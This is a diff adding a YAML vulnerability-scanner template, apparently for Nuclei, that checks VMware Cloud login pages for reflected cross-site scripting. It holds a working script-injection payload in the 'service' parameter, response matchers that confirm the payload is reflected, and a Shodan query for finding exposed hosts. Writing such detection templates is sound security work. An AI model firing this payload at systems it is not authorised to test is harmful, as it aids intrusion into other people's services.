@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - </script><script>alert(document.domain)</script>
+    - let tokens = "
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>'
+id: vmware-cloud-xss
+info:
+  author: tess
+  description: VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.
+  metadata:
+    max-request: 1
+    shodan-query: title:"Vmware Cloud"
+    verified: true
+  name: VMWare Cloud - Cross Site Scripting
+  severity: medium
+  tags: vmware,xss,cloud
